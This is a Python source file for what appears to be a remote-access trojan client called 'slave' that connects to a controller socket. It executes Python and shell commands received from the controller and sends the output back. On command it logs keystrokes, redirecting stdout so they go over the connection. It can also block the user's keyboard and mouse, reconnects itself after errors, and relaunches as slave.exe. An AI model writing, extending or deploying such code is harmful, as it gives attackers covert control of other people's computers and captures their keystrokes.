from pynput import keyboard, mouse
import sys
import subprocess
import os
from commun import client
from proc import message_processor
import pyautogui


class listener:
    def __init__(self) -> None:
        self.listening = False

        self.listener = keyboard.Listener(
            on_press=self.on_press)
        self.listener.start()

    def on_press(self, key):
        if self.listening:
            try:
                print('key {0} pressed'.format(
                    key.char))
            except AttributeError:
                print('key {0} pressed'.format(
                    key))


class slave:

    def __init__(self) -> None:
        self.lis = listener()
        self.com = None
        self.processor = None

        print('slave online')
        pyautogui.FAILSAFE = False
        self.crash_preventer()

    def boot(self):
        self.com = client('slave', 'localhost', 8888)
        sys.stdout.write = self.write
        self.processor = message_processor()

    # unused pylint: disable=exec-used, broad-except

    def crash_preventer(self):
        try:
            self.boot()
            self.main()
        except ConnectionAbortedError:
            self.crash_preventer()
        except ConnectionResetError:
            self.crash_preventer()

    def supress(self):
        key_sup = keyboard.Listener(suppress=True)
        mou_sup = mouse.Listener(suppress=True)
        key_sup.start()
        mou_sup.start()

    def execute_python(self):
        try:
            exec(self.processor.message['msg'])
        except Exception as error_code:
            self.processor.message = str(error_code)
            self.com.send_message(self.processor.message, self.com.socket)


    def execute_bash(self):
        if 'cd' in self.processor.message['msg'].lower():
            os.chdir(' '.join(self.processor.message['msg'].split()[1:]))
        output = subprocess.getoutput(self.processor.message['msg'])
        if output:
            self.processor.message = output
            self.com.send_message(self.processor.message, self.com.socket)

    def type_handler(self):
        msg_type = self.processor.message['flags']['type']


        if msg_type == 'PY':
            self.execute_python()

        elif msg_type == 'BASH':
            self.execute_bash()

        else:
            self.processor.message = f'message: ({self.processor.message["msg"]}) was received, but wasnt handled'
            self.com.send_message(self.processor.message, self.com.socket)

    def write(self, msg):
        if msg == '\n':
            return
        self.processor.message = msg
        self.com.send_message(self.processor.message, self.com.socket)

    def main(self) -> None:
        """main function that runs the code"""

        message_list = []
        multi = False
        to_execute = False
        while True:
            self.processor.message = self.com.receive_message(self.com.socket)
            if self.processor.message == '\n':
                raise ConnectionResetError

            if self.processor.message['msg'] == '$RESTART':
                subprocess.getoutput('start slave.exe')
                sys.exit()
            elif self.processor.message['msg'] == '$LISTEN':
                self.lis.listening = True
                continue
            elif self.processor.message['msg'] == '$STOP_LISTEN':
                self.lis.listening = False
                continue

            elif self.processor.message['msg'] == '$MULTI':
                multi = True
                continue

            elif self.processor.message['msg'] == '$EXEC_MULTI':
                if multi:
                    to_execute = True

            if multi:
                if to_execute:
                    for message in message_list:
                        self.processor.message = message

                        self.type_handler()
                    multi = False
                    to_execute = False
                    message_list = []
                else:
                    message_list.append(self.processor.message)

                continue

            self.type_handler()


slave()
